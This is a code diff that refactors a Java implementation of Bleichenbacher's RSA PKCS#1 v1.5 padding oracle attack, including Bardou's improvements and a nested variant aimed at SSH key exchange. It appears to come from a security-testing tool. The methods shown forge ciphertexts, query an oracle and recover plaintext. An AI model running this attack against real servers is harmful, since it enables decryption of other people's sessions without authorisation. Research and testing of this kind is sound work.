@@ -12,13 +12,13 @@ import static de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper.ceil;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper;
+import de.rub.nds.sshattacker.attacks.pkcs1.util.PkcsConverter;
 import de.rub.nds.sshattacker.attacks.pkcs1.util.TrimmerGenerator;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import java.math.BigInteger;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -31,8 +31,8 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     private static final Logger LOGGER = LogManager.getLogger();
     // private MathHelper mathHelper = new MathHelper();
-    CustomRsaPublicKey hostPublicKey;
-    CustomRsaPublicKey serverPublicKey;
+    private final CustomRsaPublicKey hostPublicKey;
+    private final CustomRsaPublicKey serverPublicKey;
 
     private final BigInteger big_two = BigInteger.valueOf(2);
 
@@ -47,8 +47,8 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     private boolean innerTrimmed = false;
     private boolean outerTrimmed = false;
-    private int innerTrimmers = 1500;
-    private int outerTrimmers = 500;
+    private static final int innerTrimmers = 1500;
+    private static final int outerTrimmers = 500;
 
     private boolean classic = false;
 
@@ -69,23 +69,86 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /**
-     * Manipulates the ciphertext by performing the following steps: 1. Computes the exponentiated
-     * value of s using the public exponent e and modulus n. 2. Converts the ciphertext array c to a
-     * BigInteger cipher. 3. Multiplies cipher with exponentiated and stores the result in res. 4.
-     * Computes the modulus of res with n and returns the result.
+     * Perform the step 2a of the Bleichenbacher Attack inkl. Skipping holes and Trimming
+     * improvements from Bardou.
      *
-     * @param s The value to be exponentiated.
-     * @param e The public exponent.
-     * @param n The modulus.
-     * @param c The ciphertext as a byte array.
-     * @return The manipulated ciphertext as a BigInteger.
+     * @param lowerBound the lower bound value
+     * @param ciphertext the ciphertext to manipulate
+     * @param rsaPublicKey the RSA public key
+     * @param outerKey the outer key
+     * @param M the list of intervals
+     * @return the final result of step 2a
      */
-    private BigInteger manipulateCiphertext(BigInteger s, BigInteger e, BigInteger n, byte[] c) {
-        BigInteger exponentiated = s.modPow(e, n);
-        BigInteger cipher = new BigInteger(1, c);
-        BigInteger res = cipher.multiply(exponentiated);
+    private BigInteger step2a(
+            BigInteger lowerBound,
+            byte[] ciphertext,
+            CustomRsaPublicKey rsaPublicKey,
+            CustomRsaPublicKey outerKey,
+            List<Interval> M) {
 
-        return res.mod(n);
+        BigInteger s = lowerBound;
+        boolean oracleResult;
+        BigInteger high = null, low = null, j = BigInteger.ONE;
+
+        if (!classic) {
+            // ceil(3*B+j*n,a)
+            low = ceil(three_B.add(j.multiply(rsaPublicKey.getModulus())), M.get(0).lower);
+
+            // ceil(2*B+(j+1)*n,b)-1
+            high =
+                    ceil(
+                            two_B.add((j.add(BigInteger.ONE).multiply(rsaPublicKey.getModulus()))),
+                            M.get(0).upper);
+
+            high = high.subtract(BigInteger.ONE);
+        }
+
+        while (true) {
+            // only skip holes in improved version
+            if (!classic) {
+                if (j.compareTo(BigInteger.ZERO) > 0) {
+                    BigInteger[] result = checkAndSkipS(s, j, low, high, rsaPublicKey, M.get(0));
+                    s = result[0];
+                    j = result[1];
+                    high = result[2];
+                    low = result[3];
+                }
+            }
+
+            BigInteger attempt =
+                    manipulateCiphertext(
+                            s,
+                            rsaPublicKey.getPublicExponent(),
+                            rsaPublicKey.getModulus(),
+                            ciphertext);
+
+            if (outerKey != null) {
+                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
+
+                oracleResult = queryOracle(encryptedAttempt, true);
+                counterInnerBleichenbacher++;
+
+            } else {
+                oracleResult = queryOracle(attempt, false);
+
+                if (counterOuterBleichenbacher == 0) {
+                    LOGGER.fatal("first");
+                    LOGGER.fatal(
+                            ArrayConverter.bytesToHexString(
+                                    ArrayConverter.bigIntegerToByteArray(attempt)));
+                }
+                counterOuterBleichenbacher++;
+            }
+            if (oracleResult) {
+                LOGGER.fatal("2a");
+                LOGGER.fatal(
+                        ArrayConverter.bytesToHexString(
+                                ArrayConverter.bigIntegerToByteArray(attempt)));
+                return s;
+            }
+
+            s = s.add(BigInteger.ONE);
+        }
     }
 
     /**
@@ -231,129 +294,6 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /**
-     * Implements "Skipping Holes" from Bardou, tests if s may be valid, returns if true or skips to
-     * the next valid s if false
-     *
-     * @param s The value to be checked.
-     * @param j Incrementor for the Holes
-     * @param low The lower bound of the range.
-     * @param high The upper bound of the range.
-     * @return The updated value of 's' to be used in the next iteration.
-     */
-    private BigInteger[] checkAndSkipS(
-            BigInteger s,
-            BigInteger j,
-            BigInteger low,
-            BigInteger high,
-            CustomRsaPublicKey publicKey,
-            Interval M) {
-        while (true) {
-            if (s.compareTo(low) >= 0 && s.compareTo(high) <= 0) {
-                s = high.add(BigInteger.ONE);
-            } else if (low.compareTo(high) > 0) {
-                LOGGER.info("thats it - no more holes");
-                return new BigInteger[] {s, BigInteger.ZERO, BigInteger.ZERO, BigInteger.ZERO};
-            } else if (s.compareTo(low) < 0) {
-                return new BigInteger[] {s, j, high, low};
-            }
-            j = j.add(BigInteger.ONE);
-            low = ceil(three_B.add(j.multiply(publicKey.getModulus())), M.lower); // ceil(3*B+j*n,a)
-            high =
-                    ceil(
-                                    two_B.add(
-                                            (j.add(BigInteger.ONE)
-                                                    .multiply(publicKey.getModulus()))),
-                                    M.upper)
-                            .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1
-
-            LOGGER.info("Skipping {} Values", high.subtract(low).intValue());
-        }
-    }
-
-    /**
-     * Perform the step 2a of the Bleichenbacher Attack inkl. Skipping holes and Trimming
-     * improvements from Bardou.
-     *
-     * @param lowerBound the lower bound value
-     * @param ciphertext the ciphertext to manipulate
-     * @param rsaPublicKey the RSA public key
-     * @param outerKey the outer key
-     * @param M the list of intervals
-     * @return the final result of step 2a
-     */
-    private BigInteger step2a(
-            BigInteger lowerBound,
-            byte[] ciphertext,
-            CustomRsaPublicKey rsaPublicKey,
-            CustomRsaPublicKey outerKey,
-            List<Interval> M) {
-
-        BigInteger s = lowerBound;
-        boolean oracleResult;
-        BigInteger high = null, low = null, j = BigInteger.ONE;
-
-        if (!classic) {
-            // ceil(3*B+j*n,a)
-            low = ceil(three_B.add(j.multiply(rsaPublicKey.getModulus())), M.get(0).lower);
-
-            // ceil(2*B+(j+1)*n,b)-1
-            high =
-                    ceil(
-                            two_B.add((j.add(BigInteger.ONE).multiply(rsaPublicKey.getModulus()))),
-                            M.get(0).upper);
-
-            high = high.subtract(BigInteger.ONE);
-        }
-
-        while (true) {
-            // only skip holes in improved version
-            if (!classic) {
-                if (j.compareTo(BigInteger.ZERO) > 0) {
-                    BigInteger[] result = checkAndSkipS(s, j, low, high, rsaPublicKey, M.get(0));
-                    s = result[0];
-                    j = result[1];
-                    high = result[2];
-                    low = result[3];
-                }
-            }
-
-            BigInteger attempt =
-                    manipulateCiphertext(
-                            s,
-                            rsaPublicKey.getPublicExponent(),
-                            rsaPublicKey.getModulus(),
-                            ciphertext);
-
-            if (outerKey != null) {
-                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
-
-                oracleResult = queryOracle(encryptedAttempt, true);
-                counterInnerBleichenbacher++;
-
-            } else {
-                oracleResult = queryOracle(attempt, false);
-
-                if (counterOuterBleichenbacher == 0) {
-                    LOGGER.fatal("first");
-                    LOGGER.fatal(
-                            ArrayConverter.bytesToHexString(
-                                    ArrayConverter.bigIntegerToByteArray(attempt)));
-                }
-                counterOuterBleichenbacher++;
-            }
-            if (oracleResult) {
-                LOGGER.fatal("2a");
-                LOGGER.fatal(
-                        ArrayConverter.bytesToHexString(
-                                ArrayConverter.bigIntegerToByteArray(attempt)));
-                return s;
-            }
-
-            s = s.add(BigInteger.ONE);
-        }
-    }
-
-    /**
      * Searches for a valid s-value as part of the paralle threats method from klima, pretending
      * only one interval was found to search for the next s-value
      *
@@ -362,7 +302,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param ciphertext the ciphertext, for which the s-values should be found
      * @param rsaPublicKey the public-key for which the s-values should be found
      * @param outerKey the outer encryption key
-     * @return
+     * @return BigInteger[] with: 0 / 1 if failed or success, the tests s-value and the used r value
      */
     private BigInteger[] step2cSingle(
             BigInteger lowerBound,
@@ -428,7 +368,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param ciphertext the ciphertext, for which the s-values should be found
      * @param rsaPublicKey the public-key for which the s-values should be found
      * @param outerKey the outer encryption key
-     * @return
+     * @return the found s-value
      */
     private BigInteger step2c(
             BigInteger lowerBound,
@@ -486,7 +426,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      *
      * @param M the known intervals of the previous attack-steps
      * @param intervalToInsert the newly found interval, which should be inserted
-     * @return
+     * @return the new Intervall M
      */
     static List<Interval> safeIntervalInsert(List<Interval> M, Interval intervalToInsert) {
         for (int i = 0; i < M.size(); i++) {
@@ -511,7 +451,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param M the previoud found Intervals
      * @param s the found s-value which generates a valid PCKS-Padding
      * @param rsaPublicKey the public key, for which the ciphertext should be decrypted
-     * @return
+     * @return the new Intervall M
      */
     private List<Interval> updateInterval(
             List<Interval> M, BigInteger s, CustomRsaPublicKey rsaPublicKey) {
@@ -560,17 +500,15 @@ public class Bleichenbacher extends Pkcs1Attack {
         this.classic = classic;
 
         if (hostPublicKey.getModulus().bitLength() > serverPublicKey.getModulus().bitLength()) {
-            byte[] cracked =
-                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
+            byte[] cracked = nestedBleichenbacher(encryptedMsg, serverPublicKey, hostPublicKey);
             LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
-            byte[] cracked_decoded = pkcs1Decode(cracked);
+            byte[] cracked_decoded = PkcsConverter.doPkcsDecoding(cracked);
             LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
             solution = new BigInteger(cracked_decoded);
         } else {
-            byte[] cracked =
-                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
+            byte[] cracked = nestedBleichenbacher(encryptedMsg, serverPublicKey, hostPublicKey);
             LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
-            byte[] cracked_decoded = pkcs1Decode(cracked);
+            byte[] cracked_decoded = PkcsConverter.doPkcsDecoding(cracked);
             LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
             solution = new BigInteger(cracked_decoded);
         }
@@ -583,7 +521,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param ciphertext The Ciphertext, which should be decrypted
      * @param innerPublicKey The known public key, for the inner encryption for the ciphertext
      * @param outerPublicKey The known public key, for the outer encryption for the ciphertext
-     * @return
+     * @return the decrypted Plaintext
      */
     private byte[] nestedBleichenbacher(
             byte[] ciphertext,
@@ -601,7 +539,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
         byte[] encoded_inner_ciphertext = Bleichenbacher(ciphertext, outerPublicKey, null);
-        byte[] innerCiphertext = pkcs1Decode(encoded_inner_ciphertext);
+        byte[] innerCiphertext = PkcsConverter.doPkcsDecoding(encoded_inner_ciphertext);
 
         B = big_two.pow(8 * (innerK - 2));
         two_B = B.multiply(big_two);
@@ -610,6 +548,130 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
         return Bleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey);
+    }
+
+    /**
+     * Perform the inner Bleichenbacher algorithm.
+     *
+     * @param ciphertext The ciphertext to decrypt.
+     * @param innerPublicKey The inner RSA public key.
+     * @param outerPublicKey The outer RSA public key.
+     * @return The decrypted plaintext as a byte array.
+     */
+    private byte[] Bleichenbacher(
+            byte[] ciphertext,
+            CustomRsaPublicKey innerPublicKey,
+            CustomRsaPublicKey outerPublicKey) {
+
+        int innerBitsize = innerPublicKey.getModulus().bitLength();
+        int innerK = innerBitsize / 8;
+        BigInteger s;
+
+        LOGGER.debug(
+                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
+                innerBitsize,
+                innerK,
+                B.toString(16),
+                two_B.toString(16),
+                three_B.toString(16),
+                three_B_sub_one.toString(16),
+                bytesToHex(ciphertext));
+
+        List<Interval> M = new ArrayList<>();
+        M.add(new Interval(two_B, three_B_sub_one));
+        LOGGER.debug(
+                "M lower: {} M upper: {}",
+                M.get(0).lower.toString(16),
+                M.get(0).upper.toString(16));
+
+        // only applie trimmes in improved run
+        if (!classic) {
+            int maxTrimmes = outerPublicKey != null ? innerTrimmers : outerTrimmers;
+
+            M = trimM0(ciphertext, innerPublicKey, outerPublicKey, maxTrimmes);
+        }
+
+        s =
+                step2a(
+                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
+                        ciphertext,
+                        innerPublicKey,
+                        outerPublicKey,
+                        M);
+
+        LOGGER.debug(
+                "found s, initial updating M lower: {} M upper: {}",
+                M.get(0).lower.toString(16),
+                M.get(0).upper.toString(16));
+
+        M = updateInterval(M, s, innerPublicKey);
+        LOGGER.debug("Length: {} M: {}", M.size(), M.toString());
+
+        while (true) {
+            if (M.size() >= 2) {
+
+                if (!classic) {
+                    s =
+                            step2b(
+                                    M,
+                                    s.add(BigInteger.ONE),
+                                    ciphertext,
+                                    innerPublicKey,
+                                    outerPublicKey);
+                } else {
+                    s = step2b(s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
+                }
+
+            } else if (M.size() == 1) {
+                BigInteger a = M.get(0).lower;
+                BigInteger b = M.get(0).upper;
+                if (a.equals(b)) {
+                    return ArrayConverter.bigIntegerToByteArray(a);
+                }
+                s = step2c(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
+            }
+            M = updateInterval(M, s, innerPublicKey);
+        }
+    }
+
+    /**
+     * Implements "Skipping Holes" from Bardou, tests if s may be valid, returns if true or skips to
+     * the next valid s if false
+     *
+     * @param s The value to be checked.
+     * @param j Incrementor for the Holes
+     * @param low The lower bound of the range.
+     * @param high The upper bound of the range.
+     * @return The updated value of 's' to be used in the next iteration.
+     */
+    private BigInteger[] checkAndSkipS(
+            BigInteger s,
+            BigInteger j,
+            BigInteger low,
+            BigInteger high,
+            CustomRsaPublicKey publicKey,
+            Interval M) {
+        while (true) {
+            if (s.compareTo(low) >= 0 && s.compareTo(high) <= 0) {
+                s = high.add(BigInteger.ONE);
+            } else if (low.compareTo(high) > 0) {
+                LOGGER.info("thats it - no more holes");
+                return new BigInteger[] {s, BigInteger.ZERO, BigInteger.ZERO, BigInteger.ZERO};
+            } else if (s.compareTo(low) < 0) {
+                return new BigInteger[] {s, j, high, low};
+            }
+            j = j.add(BigInteger.ONE);
+            low = ceil(three_B.add(j.multiply(publicKey.getModulus())), M.lower); // ceil(3*B+j*n,a)
+            high =
+                    ceil(
+                                    two_B.add(
+                                            (j.add(BigInteger.ONE)
+                                                    .multiply(publicKey.getModulus()))),
+                                    M.upper)
+                            .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1
+
+            LOGGER.info("Skipping {} Values", high.subtract(low).intValue());
+        }
     }
 
     private List<Interval> trimM0(
@@ -705,90 +767,6 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /**
-     * Perform the inner Bleichenbacher algorithm.
-     *
-     * @param ciphertext The ciphertext to decrypt.
-     * @param innerPublicKey The inner RSA public key.
-     * @param outerPublicKey The outer RSA public key.
-     * @return The decrypted plaintext as a byte array.
-     */
-    private byte[] Bleichenbacher(
-            byte[] ciphertext,
-            CustomRsaPublicKey innerPublicKey,
-            CustomRsaPublicKey outerPublicKey) {
-
-        int innerBitsize = innerPublicKey.getModulus().bitLength();
-        int innerK = innerBitsize / 8;
-        BigInteger s;
-
-        LOGGER.debug(
-                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
-                innerBitsize,
-                innerK,
-                B.toString(16),
-                two_B.toString(16),
-                three_B.toString(16),
-                three_B_sub_one.toString(16),
-                bytesToHex(ciphertext));
-
-        List<Interval> M = new ArrayList<>();
-        M.add(new Interval(two_B, three_B_sub_one));
-        LOGGER.debug(
-                "M lower: {} M upper: {}",
-                M.get(0).lower.toString(16),
-                M.get(0).upper.toString(16));
-
-        // only applie trimmes in improved run
-        if (!classic) {
-            int maxTrimmes = outerPublicKey != null ? innerTrimmers : outerTrimmers;
-
-            M = trimM0(ciphertext, innerPublicKey, outerPublicKey, maxTrimmes);
-        }
-
-        s =
-                step2a(
-                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
-                        ciphertext,
-                        innerPublicKey,
-                        outerPublicKey,
-                        M);
-
-        LOGGER.debug(
-                "found s, initial updating M lower: {} M upper: {}",
-                M.get(0).lower.toString(16),
-                M.get(0).upper.toString(16));
-
-        M = updateInterval(M, s, innerPublicKey);
-        LOGGER.debug("Length: {} M: {}", M.size(), M.toString());
-
-        while (true) {
-            if (M.size() >= 2) {
-
-                if (!classic) {
-                    s =
-                            step2b(
-                                    M,
-                                    s.add(BigInteger.ONE),
-                                    ciphertext,
-                                    innerPublicKey,
-                                    outerPublicKey);
-                } else {
-                    s = step2b(s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
-                }
-
-            } else if (M.size() == 1) {
-                BigInteger a = M.get(0).lower;
-                BigInteger b = M.get(0).upper;
-                if (a.equals(b)) {
-                    return ArrayConverter.bigIntegerToByteArray(a);
-                }
-                s = step2c(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
-            }
-            M = updateInterval(M, s, innerPublicKey);
-        }
-    }
-
-    /**
      * A helper function to create a hex-string from bytes
      *
      * @param bytes The bytes, which should be returned as hex-string
@@ -800,34 +778,6 @@ public class Bleichenbacher extends Pkcs1Attack {
             result.append(String.format("%02x", b));
         }
         return result.toString();
-    }
-
-    /**
-     * A helper function to remove a PKCS#1-encoded-Padding
-     *
-     * @param encodedPayload The PKCS#1-encoded Payload
-     * @return The raw payload, without padding and header.
-     */
-    private byte[] pkcs1Decode(byte[] encodedPayload) {
-        /*
-            This function removes the header and the padding from the PKCS#1 v1.5
-            Encoding Scheme
-        */
-        encodedPayload = Arrays.copyOfRange(encodedPayload, 2, encodedPayload.length);
-
-        int idx = 0;
-        for (int i = 0; i < encodedPayload.length; i++) {
-            if (encodedPayload[i] == 0x00) {
-                idx = i;
-                break;
-            }
-        }
-
-        if (idx != 0) {
-            idx = idx + 1;
-        }
-
-        return Arrays.copyOfRange(encodedPayload, idx, encodedPayload.length);
     }
 
     /**
@@ -855,6 +805,29 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
     }
 
+    /**
+     * Manipulates the ciphertext by performing the following steps: 1. Computes the exponentiated
+     * value of s using the public exponent e and modulus n. 2. Converts the ciphertext array c to a
+     * BigInteger cipher. 3. Multiplies cipher with exponentiated and stores the result in res. 4.
+     * Computes the modulus of res with n and returns the result.
+     *
+     * @param s The value to be exponentiated.
+     * @param e The public exponent.
+     * @param n The modulus.
+     * @param c The ciphertext as a byte array.
+     * @return The manipulated ciphertext as a BigInteger.
+     */
+    private BigInteger manipulateCiphertext(BigInteger s, BigInteger e, BigInteger n, byte[] c) {
+        BigInteger exponentiated = s.modPow(e, n);
+        BigInteger cipher = new BigInteger(1, c);
+        BigInteger res = cipher.multiply(exponentiated);
+
+        return res.mod(n);
+    }
+
+    /*
+     * Collect all getters for stats down here
+     */
     public int getCounterInnerBleichenbacher() {
         return counterInnerBleichenbacher;
     }
